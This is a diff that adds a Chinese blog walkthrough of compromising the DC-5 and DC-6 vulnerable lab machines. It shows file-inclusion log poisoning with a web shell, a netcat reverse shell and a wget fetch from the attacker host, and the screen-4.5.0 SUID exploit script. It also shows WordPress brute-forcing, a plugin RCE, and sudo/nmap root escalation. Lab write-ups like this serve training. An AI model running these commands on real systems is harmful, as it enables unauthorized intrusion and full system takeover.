@@ -1719,4 +1719,219 @@
 <p>成功拿到了flag。</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>DC5-6靶机复现</title>
+    <url>/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="DC5-6靶机复现"><a href="#DC5-6靶机复现" class="headerlink" title="DC5-6靶机复现"></a>DC5-6靶机复现</h1><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>在扫描出来的结果中查找，有可疑端口的IP既为靶机地址</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A31.png" class>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx 1.6.2</span><br><span class="line">80  http</span><br><span class="line">111  rpcbind2-4</span><br><span class="line">53869 status</span><br></pre></td></tr></table></figure>
+
+<p>可以看到目标靶机开放了80 111 53869三个端口，既然80端口开放了http服务，我们先访问一下</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>界面有5个选项，每一个选项点击之后都显示访问了不同的php文件，我们再来使用diresearch看看有没有隐藏的php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diresearch -u 192.168.10.139</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>发现除了刚刚那五个可以访问到的php文件就只剩footer.php文件了，我们尝试访问</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>
+
+<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>可以看到footer.php的内容就是thankyou.php底部的内容（thankyou.php就是点击submit之后访问的php），并且每次重新访问thankyou.php之后再次重新访问footer.php，footer.php的内容也会变更至和footer.php一样，所以我们猜测thankyou.php包含了footer.php</p>
+<p>那么这其中就存在了文件包含漏洞，那我们首先找寻一下包含的是那】哪个参数，这里就使用burpsuite</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37png.png" class>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>
+
+<p>模式就设置为sniper模式，进行爆破</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>
+
+<p>得到变量名应该是file</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>
+
+<p>可以看到包含并访问成功</p>
+<h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>上面得知，这个http的服务器是nginx1.6.2，而我们已经知道nginx的日志文件是access.log根据之前所做过的一道类似ctf题，我们抓包进行UA配合日志文件传木马</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>
+
+<p>放包成功写入，再次包含访问日志文件，然后用蚁剑配合我们刚上传上去的一句话木马进行访问</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>
+
+<p>进去之后使用蚁剑打开虚拟终端进行一些基础操作</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>
+
+<p>可以看到我们现在只是一个www-data的普通用户，并不是root，但是始终使用这个终端有点不方便（因为没有那么多工具），使用nc来反弹shell到我们kali的攻击机上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.10.129 4441</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>
+
+<p>反弹shell成功，拿到shell，首先使用python语言来获得交互式shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就是提权啦，想到最常见的就是suid提权，使用下面的语句来查看哪些命令具有suid权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>
+
+<p>发现其中有一个screen-4.5.0很可疑，使用kali自带的漏洞库对其进行查找</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>
+
+<p>根据版本，一眼就看中了这俩，我们分别查看一下其中内容，在41154.sh里面发现了直接的步骤</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>
+
+<p>可以看到EOF隔开了我们要创建的文件和结束后需要执行的命令</p>
+<p><strong>第一部分</strong></p>
+<p>在tmp目录下创建libhax.c文件，将内容复制进去，这个我们在蚁剑里执行即可</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>
+
+<p><strong>第二部分</strong></p>
+<p>第二部分就是在&#x2F;tmp目录下创建一个rootshell.c文件，然后保存后执行相应命令</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png" class>
+
+<p><strong>第三部分</strong></p>
+<p>创建一个.sh文件，文件内容为所给步骤中的剩余代码，前面记得加上#!&#x2F;bin&#x2F;bash，注意：保存要输入set ff&#x3D;unix，是为了防止脚本的格式错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p>我们先在kali机上创建一个d.sh文件，然后再将他下载到靶机上：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim d.sh</span><br><span class="line">mv d.sh /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上的&#x2F;tmp目录下进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.10.129/d.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png" class>
+
+<p>成功写入</p>
+<p><strong>如果觉得第三部分像上面这么做比较麻烦，难以理解，也可以依次输入exp里剩下的命令</strong></p>
+<p>接下来就是使用蚁剑反弹给kali的shell继续执行下一步的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x d.sh</span><br><span class="line">./d.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>
+
+<p>成功拿到root权限</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png" class>
+
+<p>成功拿到flag。</p>
+<h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，使用nmap找到目标靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>一眼就相中了这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">80 http Apache2.4.25</span><br><span class="line">22 ssh</span><br></pre></td></tr></table></figure>
+
+<p>下面访问一下80端口，看一下界面，一开始是访问失败的哈，所以要像DC2一样将对应ip和域名写进C:\Windows\System32\drivers\etc\hosts里面</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>之后直接在浏览器尝试访问，访问时间有点长，稍安勿躁</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>可以看到有cms为wordpress，那我们就想到的是DC2用到的针对wordpress的渗透工具wpscan，首先使用dirb，或者diresearch扫一下目录</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>
+
+<p>依次访问一下，很快就在其中找到了登录界面</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>
+
+<h3 id="爆破进行登录"><a href="#爆破进行登录" class="headerlink" title="爆破进行登录"></a>爆破进行登录</h3><p>我们既然知道了有wpscan，那就用wpscan爆破一下用户名和密码，先爆破用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -e u</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>
+
+<p>扫描到五个用户，将他们全部输出到users.txt里面，也可以使用命令在扫描时就生成或者自己写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin&quot; &gt; users.txt</span><br><span class="line">echo &quot;graham&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;mark&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;sarah&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;jens&quot; &gt;&gt; users.txt</span><br></pre></td></tr></table></figure>
+
+<p>下一步就是通过cewl来尝试生成密码字典进行爆破登录了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://wordy -w passwd.txt</span><br></pre></td></tr></table></figure>
+
+<p>密码字典生成之后再使用wpscan进行用户名与密码的爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>
+
+<p>这样子爆破失败了，我们还是使用kali自带的密码字典吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先解压密码字典</span><br><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; pwd.txt</span><br><span class="line"></span><br><span class="line">#用户名和密码字典都有了，开始爆破</span><br><span class="line">wpscan --url wordy -U user.txt -P pwd.txt</span><br><span class="line">#爆破出来账号：mark 密码：helpdesk01</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>
+
+<p>登陆进去</p>
+<h3 id="漏洞查找-amp-反弹shell"><a href="#漏洞查找-amp-反弹shell" class="headerlink" title="漏洞查找&amp;反弹shell"></a>漏洞查找&amp;反弹shell</h3><img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>
+
+<p>这里不知道该咋办，看看wp，发现是Activity monitor这个插件存在远程代码执行漏洞</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>
+
+<p>使用45274.html</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>
+
+<p>里面给出了代码，我们把他复制一份出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br><span class="line">vim 45274.html</span><br><span class="line"></span><br><span class="line">#攻击机上监听端口</span><br><span class="line">nc -lvvp 4441</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>
+
+<p>1的地方改为我们的目标网址，2的地方就改成我们的攻击机和监听端口</p>
+<p>开启攻击机的http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>
+
+<p>点击submit request之后就拿到了反弹后的shell</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>
+
+<p>使用python语言获得交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>之后还是常见的查看是否有suid提权，没什么发现</p>
+<p>进入到mark用户的家目录下，stuff文件下有一个things-to-do.txt文件，查看文件内容发现graham用户及登录密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/mark/stuff</span><br><span class="line">cat things-to-do.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>
+
+<p>发现了新用户graham ，密码为GSo7isUM1D4尝试使用su进行用户登录</p>
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>
+
+<p>可以看到登录成功，接下来再看看有当前用户可执行操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>
+
+<p>发现&#x2F;home&#x2F;jens&#x2F;backups.sh是不需要密码的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本（因为这个脚本是在jens用户目录下）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</span><br><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>
+
+<p>可以看到切换成功，再次使用sudo-l看看jens用户可执行什么命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>
+
+<p>发现jens用户可以无密码执行&#x2F;usr&#x2F;bin&#x2F;nmap命令</p>
+<p>百度到可以写入一条命令到getShell，并通过nmap运行getShell成功进入root用户，在&#x2F;root目录下找到theflag.txt文件（注意切换目录）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> theflag.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>
+]]></content>
+  </entry>
 </search>
